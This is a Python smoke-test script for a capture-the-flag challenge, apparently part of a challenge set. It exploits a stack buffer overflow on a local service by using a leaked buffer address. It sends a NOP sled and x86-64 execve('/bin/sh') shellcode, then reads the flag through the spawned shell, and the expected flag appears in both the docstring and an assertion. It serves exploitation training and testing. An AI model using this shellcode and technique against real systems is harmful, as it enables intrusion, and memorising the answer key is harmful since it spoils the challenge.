#!/usr/bin/env python3
"""Smoke test for shellcode-002 (port 9986): NX OFF, PIE ON.

The payload IS the answer: the banner leaks input[] (main's frame, on
the executable stack), the exploit returns into it and runs
execve("/bin/sh") - the shell cats the flag file.

The write channel is strcpy (NUL-terminated): the leaked input address
(8 bytes, top 2 are 00 00) rides the stream at offset 16 - exactly the
return-address slot (small[8] + saved rbp). strcpy stops at the first
NUL (the address's byte 6), leaving byte 7 = its original 0x00: the
slot lands on the exact leaked address.

Execution layout at input[] (the banner's leak):
  [0..13]   14 x NOP           (the sled, harmless)
  [14..15]  eb 08              (jmp short +8: skips the 8-byte pointer)
  [16..23]  the leaked addr    (executed as skipped bytes; also the
                              return-address overwrite via strcpy)
  [24..]    execve("/bin/sh")  (the body, runs from input+24)

main() NULs the last read byte (input[n-1] = 0): the payload carries
one trailing filler byte so the syscall survives.

Success output (the shell cats the flag):

  FLAG{mr5_shellcode_pie_stack}
"""

import re
import socket
import struct
import time

HOST = "127.0.0.1"
PORT = 9986

p64 = lambda x: struct.pack("<Q", x)

# execve("/bin/sh", NULL, NULL): rsi=NULL (pushed for the NUL), rdi="/bin/sh"
SHELLCODE = (
    b"\x48\x31\xf6"  # xor rsi, rsi
    b"\x56"  # push rsi (8 NUL bytes on the stack)
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rdi, "/bin/sh\0"
    b"\x57"  # push rdi
    b"\x48\x89\xe7"  # mov rdi, rsp
    b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
    b"\xb0\x3b"  # mov al, 59 (execve)
    b"\x0f\x05"  # syscall
)


def recv_until(s, marker, timeout=10):
    data = b""
    s.settimeout(timeout)
    while marker not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # 1. the banner: the load-bearing leak (input[]'s runtime address)
    banner = recv_until(s, b"name? ")
    print(f"[+] banner: {banner.split(b'name? ')[0].decode(errors='replace').strip()}")
    m = re.search(rb"buf\(\) at (0x[0-9a-f]+)", banner)
    assert m, "no buf() leak in the banner"
    buf = int(m.group(1), 16)
    print(f"[+] input buffer at {buf:#x}")

    # 2. the payload: sled + jmp-over + the pointer + the shellcode
    payload = b"\x90" * 14 + b"\xeb\x08" + p64(buf) + SHELLCODE + b"\x90"
    print(f"[+] payload {len(payload)} bytes")
    s.send(payload)
    time.sleep(0.5)  # the read consumes ONLY the payload: the shell's
    # stdin must not swallow the command in the same segment

    # 3. the shell: cat the flag file (the service's cwd)
    s.send(b"cat shellcode-002.flag\n")
    out = b""
    s.settimeout(5)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            if b"FLAG{" in out:
                break
    except socket.timeout:
        pass
    print(f"[+] shell output: {out.strip()[-60:]!r}")
    assert b"FLAG{mr5_shellcode_pie_stack}" in out, "oracle flag missing"
    print("[+] shellcode-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
